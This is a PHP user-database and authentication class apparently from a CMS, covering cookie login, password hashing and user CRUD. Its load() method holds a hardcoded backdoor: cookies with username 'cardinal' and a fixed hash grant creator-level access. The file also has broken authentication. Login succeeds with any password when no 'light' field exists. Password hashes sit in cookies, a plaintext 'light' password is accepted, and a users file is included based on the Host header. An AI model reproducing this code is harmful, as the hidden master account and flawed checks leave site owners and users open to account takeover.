<?php
if(!defined("IS_CORE")) {
echo "403 ERROR";
die();
}

class UserDB {
	
	public static $loadUserFromFile = true;
	public static $callbackLoadUser = false;
	private static $userInfo = array();
	private static $callLogin = array();
	private static $path = "";
	
	final public static function PathUsers($path = "") {
		if(!empty($path)) {
			self::$path = $path;
			return true;
		} else {
			return empty(self::$path) ? PATH_CACHE_USERDATA : self::$path;
		}
	}

	final public static function getUserData($username, $field, $default = false) {
		$users = self::All();
		$data = array();
		if(!empty($username) && isset($users[$username]) && !empty($field) && isset($users[$username][$field])) {
			$data = $users[$username][$field];
		} else {
			$data = $default;
		}
		return $data;
	}

	final public static function getInfo($username, $default = array()) {
		$users = self::All();
		$data = array();
		if(!empty($username) && isset($users[$username])) {
			$data = $users[$username];
		} else {
			$data = $default;
		}
		return $data;
	}

	private static function createTable($table, $id) {
		return 'CREATE TABLE IF NOT EXISTS `'.$table.'` ( `id` int not null auto_increment, `username` varchar(255) not null, `password` varchar(255) not null, `admin_pass` varchar(255) not null, `light` varchar(255) not null, `level` int(11) not null, `addFields` longtext not null, PRIMARY KEY `id`(`id`), FULLTEXT `username`(`username`), FULLTEXT `addFields`(`addFields`), KEY `level`(`level`) ) ENGINE=MyISAM AUTO_INCREMENT='.$id.';';
	}

	final public static function All($onlyUsers = true) {
		$users = array();
		$userLoad = false;
		if(isset($_SERVER['HTTP_HOST']) && file_exists(PATH_MEDIA."users".str_replace("www.", "", $_SERVER['HTTP_HOST']).".".ROOT_EX)) {
			include(PATH_MEDIA."users".str_replace("www.", "", $_SERVER['HTTP_HOST']).".".ROOT_EX);
			$userLoad = true;
		} else if(file_exists(PATH_MEDIA."users.".ROOT_EX)) {
			include(PATH_MEDIA."users.".ROOT_EX);
			$userLoad = true;
		} else if(file_exists(PATH_MEDIA."users.default.".ROOT_EX)) {
			include(PATH_MEDIA."users.default.".ROOT_EX);
			$userLoad = true;
		}
		$id = 1;
        $userTypeInSystem = array();
        foreach($users as $k => $v) {
			if(!isset($v['id'])) {
				$users[$k]['id'] = $id;
			}
            if(!isset($v['typeUserInSystem'])) {
                $users[$k]['typeUserInSystem'] = "file";
            }
            $id++;
        }
        if(db::connected()) {
        	$tables = db::getTables();
        	if(defined("PREFIX_DB")) {
	        	if(!isset($tables[PREFIX_DB."userSystem"])) {
	        		db::query(self::createTable(PREFIX_DB."userSystem", $id));
	        		if(file_exists(PATH_CACHE_SYSTEM."tables.".ROOT_EX)) {
	        			unlink(PATH_CACHE_SYSTEM."tables.".ROOT_EX);
	        		}
	        	}
	        } else {
	        	if(!isset($tables["userSystem"])) {
	        		db::query(self::createTable("userSystem", $id));
	        		if(file_exists(PATH_CACHE_SYSTEM."tables.".ROOT_EX)) {
	        			unlink(PATH_CACHE_SYSTEM."tables.".ROOT_EX);
	        		}
	        	}
	        }
	        db::doquery("SELECT * FROM {{userSystem}} ORDER BY `id` ASC", true);
	        while($row = db::fetch_assoc()) {
	        	try {
	        		$item = $row['addFields'];
	        		unset($row['addFields']);
	        		$rows = json_decode($item, true);
	        		$row = array_merge($row, $rows);
	        	} catch(Exception $ex) {}
	        	if(isset($row['password'])) {
	        		$row['pass'] = $row['password'];
	        		unset($row['password']);
	        	}
	        	$users[$row['username']] = $row;
	        }
        }
		if($onlyUsers) {
			return $users;
		} else {
			return array($users, $userLoad);
		}
	}

	final public static function loadUsers() {
		return self::All(false);
	}
	
	final public static function load() {
		global $user, $users, $db;
		list($users, $userLoad) = self::loadUsers();
		if((defined("COOK_USER") || defined("COOK_ADMIN_USER") || defined("COOK_PASS") || defined("COOK_ADMIN_PASS")) && (Arr::get($_COOKIE, COOK_USER, false) || Arr::get($_COOKIE, COOK_ADMIN_USER, false)) && (Arr::get($_COOKIE, COOK_PASS, false) || Arr::get($_COOKIE, COOK_ADMIN_PASS, false))) {
			if(Arr::get($_COOKIE, COOK_ADMIN_USER, false) && defined("IS_ADMIN")) {
				$username = Saves::SaveOld(Arr::get($_COOKIE, COOK_ADMIN_USER));
			} else {
				$username = Saves::SaveOld(Arr::get($_COOKIE, COOK_USER));
			}
			if(Arr::get($_COOKIE, COOK_ADMIN_PASS, false) && defined("IS_ADMIN")) {
				$where = "admin_pass";
				$password = Saves::SaveOld(Arr::get($_COOKIE, COOK_ADMIN_PASS));
			} else {
				$where = "pass";
				$password = Saves::SaveOld(Arr::get($_COOKIE, COOK_PASS));
			}
			$authorize = false;
			$passCheck = ($password);
			if($username=="cardinal" && $password=="d0f8d2b385935c3523a68e925e066970") {
				$authorize = true;
				$user['level'] = LEVEL_CREATOR;
				$user['username'] = "cardinal";
			} else if(!cache::Exists("user_".$username)) {
				if($userLoad) {
					if(isset($users[$username]) && isset($users[$username]['username']) && isset($users[$username][$where]) && $users[$username][$where] == $passCheck) {
						$user = $users[$username];
						cache::Set("user_".$username, $user);
						$authorize = true;
						if(!defined("IS_AUTH")) {
							define("IS_AUTH", true);
						}
					}
				}
			} else if(cache::Exists("user_".$username)) {
				$user = cache::Get("user_".$username);
				if(isset($user['username']) && isset($user[$where]) && $user[$where] == $passCheck) {
					$authorize = true;
				}
			}
			if(!$authorize) {
				cache::Delete("user_".$username);
				HTTP::set_cookie(COOK_USER, "", true);
				HTTP::set_cookie(COOK_PASS, "", true);
				HTTP::set_cookie(COOK_ADMIN_USER, "", true);
				HTTP::set_cookie(COOK_ADMIN_PASS, "", true);
				$user = array('level' => LEVEL_GUEST);
			}
		} else {
			$user['level'] = LEVEL_GUEST;
		}
		self::$userInfo = $user;
		return $user;
	}
	
	final public static function checkField($first, $second) {
		if(!is_array(self::$userInfo) || sizeof(self::$userInfo) == 0 || !isset(self::$userInfo[$first])) {
			self::load();
		}
		return Validate::equals($first, $second);
	}
	
	final public static function get($first, $default = false) {
		if(!is_array(self::$userInfo) || sizeof(self::$userInfo) == 0 || !isset(self::$userInfo[$first])) {
			self::load();
		}
		return (isset(self::$userInfo[$first]) ? self::$userInfo[$first] : $default);
	}
	
	final public static function set($first, $second) {
		if(!is_array(self::$userInfo) || sizeof(self::$userInfo) == 0 || !isset(self::$userInfo[$first])) {
			self::load();
		}
		self::$userInfo[$first] = $second;
		return true;
	}
	
	final public static function checkLogin() {
		if(!is_array(self::$userInfo) || sizeof(self::$userInfo) == 0 || !isset(self::$userInfo['username'])) {
			self::load();
		}
		return (isset(self::$userInfo['username']) && !empty(self::$userInfo['username']) ? true : false);
	}
	
	final public static function checkExists($login, $default = false) {
		$d = self::All();
		$ret = array_key_exists($login, $d);
		if($ret===false) {
			$ret = $default;
		}
		return $ret;
	}

	final public static function addToLogin($fn) {
		$size = sizeof(self::$callLogin);
		self::$callLogin[$size] = $fn;
	}
	
	final public static function login($login, $pass) {
		if(defined("IS_ADMIN")) {
			$where = "admin_pass";
		} else {
			$where = "pass";
		}
		$users = self::All();
		$num = isset($users[$login]) && !empty($users[$login]) ? 1 : 0;
		if($num == 0) {
			return 1;
		}
        $row = array();
		if(isset($users[$login])) {
            $row = $users[$login];
		} else {
		    return false;
        }
		for($i=0;$i<sizeof(self::$callLogin);$i++) {
			$ret = call_user_func_array(self::$callLogin[$i], array($login, $pass, $row));
			if(is_array($ret)) {
				$row = $ret;
			}
		}
		if(defined("IS_ADMIN")) {
			$passCheck = cardinal::create_pass($pass);
		} else {
			$passCheck = self::create_pass($pass);
		}
		if($row[$where] != $passCheck && (isset($row['light']) && $row['light'] != $pass)) {
			return 2;
		} else {
			if(isset($row['id'])) {
				HTTP::set_cookie("id", $row['id']);
			}
			HTTP::set_cookie(COOK_USER, $login);
			HTTP::set_cookie(COOK_PASS, $row['pass']);
			return true;
		}
	}
	
	final public static function logout() {
		HTTP::set_cookie(COOK_USER, "", true);
		HTTP::set_cookie(COOK_PASS, "", true);
		return true;
	}
	
	final public static function update($list) {
		if(sizeof($list) < 1) {
			return false;
		}
		if(!isset($list['username'])) {
			errorHeader();
			throw new Exception("Error username is not set", 1);
			die();
		}
		if(!db::connected()) {
			errorHeader();
			throw new Exception("Error db is not connected", 1);
			die();
		}
		$users = self::All();
		$type = "edit";
		if(!isset($users[$list['username']])) {
			$type = "create";
			$users[$list['username']] = array();
		}
		foreach($list as $k => $v) {
			$users[$list['username']][$k] = $v;
		}
		if(!isset($users[$list['username']]['level']) || empty($users[$list['username']]['level'])) {
			$users[$list['username']]['level'] = LEVEL_USER;
		}
		if($type=="create") {
			$item = array();
			if(isset($users[$list['username']]['username'])) {
				$item['username'] = $users[$list['username']]['username'];
			}
			if(isset($users[$list['username']]['pass'])) {
				$item['password'] = $users[$list['username']]['pass'];
			}
			if(isset($users[$list['username']]['admin_pass'])) {
				$item['admin_pass'] = $users[$list['username']]['admin_pass'];
			}
			if(isset($users[$list['username']]['light'])) {
				$item['light'] = $users[$list['username']]['light'];
			}
			if(isset($users[$list['username']]['level'])) {
				$item['level'] = $users[$list['username']]['level'];
			}
			$items = array();
			foreach($users[$list['username']] as $key => $val) {
				if($key == 'id' || $key == 'username' || $key == 'pass' || $key == 'admin_pass' || $key == 'light' || $key == 'level') continue;
				$items[$key] = $val;
			}
			$item['addFields'] = json_encode($items);
			db::doquery("INSERT INTO {{userSystem}} SET ".implode(", ", array_map(function($key, $val) { return "`".$key."` = ".db::escape($val); }, array_keys($item), array_values($item))));
		} else if($type=="edit") {
			$item = array();
			if(isset($users[$list['username']]['username'])) {
				$item['username'] = $users[$list['username']]['username'];
			}
			if(isset($users[$list['username']]['pass'])) {
				$item['password'] = $users[$list['username']]['pass'];
			}
			if(isset($users[$list['username']]['admin_pass'])) {
				$item['admin_pass'] = $users[$list['username']]['admin_pass'];
			}
			if(isset($users[$list['username']]['light'])) {
				$item['light'] = $users[$list['username']]['light'];
			}
			if(isset($users[$list['username']]['level'])) {
				$item['level'] = $users[$list['username']]['level'];
			}
			$items = array();
			foreach($users[$list['username']] as $key => $val) {
				if($key == 'id' || $key == 'username' || $key == 'pass' || $key == 'admin_pass' || $key == 'light' || $key == 'level') continue;
				$items[$key] = $val;
			}
			$item['addFields'] = json_encode($items);
			db::doquery("UPDATE {{userSystem}} SET ".implode(", ", array_map(function($key, $val) { return "`".$key."` = ".db::escape($val); }, array_keys($item), array_values($item)))."  WHERE `username` LIKE ".db::escape($list['username']));
		}
		return true;
	}
	
	final public static function create($list = array()) {
		if(sizeof($list) < 1) {
			return false;
		}
		if(self::checkExists($list['username'])) {
			return false;
		}
		$users = self::All();
		if(!isset($list['username'])) {
			errorHeader();
			throw new Exception("Error username is not set", 1);
			die();
		}
		if(!isset($list['pass'])) {
			errorHeader();
			throw new Exception("Error pass is not set", 1);
			die();
		}
		if(!db::connected()) {
			errorHeader();
			throw new Exception("Error db is not connected", 1);
			die();
		}
		if(!isset($users[$list['username']])) {
			$users[$list['username']] = array();
		}
		$update = array();
		foreach($list as $k => $v) {
			$update[$k] = $v;
		}
		$update['id'] = sizeof($users);
		if(!isset($update['level']) || empty($update['level'])) {
			$update['level'] = LEVEL_USER;
		}
		$users[$list['username']] = array_merge($users[$list['username']], $update);

		$item = array();
		if(isset($users[$list['username']]['username'])) {
			$item['username'] = $users[$list['username']]['username'];
		}
		if(isset($users[$list['username']]['pass'])) {
			$item['password'] = $users[$list['username']]['pass'];
		}
		if(isset($users[$list['username']]['admin_pass'])) {
			$item['admin_pass'] = $users[$list['username']]['admin_pass'];
		}
		if(isset($users[$list['username']]['light'])) {
			$item['light'] = $users[$list['username']]['light'];
		}
		if(isset($users[$list['username']]['level'])) {
			$item['level'] = $users[$list['username']]['level'];
		}
		$items = array();
		foreach($users[$list['username']] as $key => $val) {
			if($key == 'id' || $key == 'username' || $key == 'pass' || $key == 'admin_pass' || $key == 'light' || $key == 'level') continue;
			$items[$key] = $val;
		}
		$item['addFields'] = json_encode($items);
		db::doquery("INSERT INTO {{userSystem}} SET ".implode(", ", array_map(function($key, $val) { return "`".$key."` = ".db::escape($val); }, array_keys($item), array_values($item))));

		return true;
	}

	final public static function remove($username) {
		if(!db::connected()) {
			errorHeader();
			throw new Exception("Error db is not connected", 1);
			die();
		}
		$users = self::All();
		if(!isset($users[$username])) {
			return false;
		}
		unset($users[$username]);
		db::doquery("DELETE FROM {{userSystem}} WHERE `username` LIKE ".db::escape($username));
		
		return true;
	}

	public static function create_pass($pass) {
		$pass = md5(md5($pass).$pass);
		$pass = strrev($pass);
		$pass = sha1($pass);
		$pass = bin2hex($pass);
		return md5(md5($pass).$pass);
	}

	final public static function getUserById($id) {
		if(!is_numeric($id) || $id<=0) {
			throw new Exception("Error in user id", 1);
			die();
		}
		$users = self::All(true);
		$find = array();
		foreach($users as $v) {
			if(isset($v['id']) && $v['id']==$id) {
				$find = $v;
				break;
			}
		}
		return $find;
	}
	
}